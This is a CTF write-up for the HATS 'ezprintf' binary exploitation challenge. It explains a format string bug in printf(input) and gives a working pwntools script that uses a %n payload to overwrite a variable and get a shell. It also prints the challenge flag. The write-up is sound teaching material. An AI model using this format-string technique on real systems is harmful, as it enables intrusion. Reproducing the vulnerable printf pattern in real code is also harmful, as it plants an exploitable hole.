---
title: "ezprintf [496]"
tags: [HATS CTF, Binary Exploitation]
excerpt: "Binary Exploitation"
layout: single
classes: wide
--- 

**Category:** Binary Exploitation

> Printf is wonky. Time to exploit its wonkyness.
>
> nc challs.hats.sg 1304
>
> Reading material:  
> https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf

## Write-up
This challenge is a standard format string challenge. 

Here's the simplified decompilation of **main**:
```c
  magic = 0;
  read(0,input,0x400);
  printf(input);
  if (magic != 0) {
    system("/bin/sh");
  }
```

Obviously, the line `printf(input);` contains a format string vulnerability. The format string argument was missing from `printf`, which could be exploited to print and overwrite addresses on the stack.

The objective of the challenge was to overwrite the value of `magic`, which would instantly give us a shell. However, the address of `magic` which was `0x0060106c`, contained a null byte, which would cause `printf` to stop "executing" our payload once the null byte was reached.

To overcome this, the address of `magic` can be placed last in the payload. We can use the format specifier `%15$n` to overwrite `magic`, where `magic` is the 15th value on the stack to be printed. This ensures `magic` is overwritten before the null byte is reached.

The payload contains the following:
1. `"%x "*21`: Prints the first 21 arguments on the stack in hex. It allows us to locate the address of `magic` in the stack after including it in our payload.
2. `"%15$n "`: The format specifier `%n` overwrites the next address on the stack with the number of bytes printed. This is used to overwrite `magic` with the number of bytes currently printed.
3. `"BBB"`: This is used to align stack, ensuring the address of `magic` isn't split up.
4. The address of `magic`.

Here's the final exploit:
```python
from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./ezprintf",
    #"libc" : "./",
    #"ld" : "./",
    "HOST" : "challs.hats.sg",
    "PORT" : 1304,
}

def exploit(p):
	magic = elf.symbols['magic'] #0x0060106c
	
	payload = "%x "*21 + "%15$n "
	payload += "BBB" + p64(magic)

	sl(payload)
	p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
 ```

**Flag:** HATS{h3h1_that_w1z_3z}
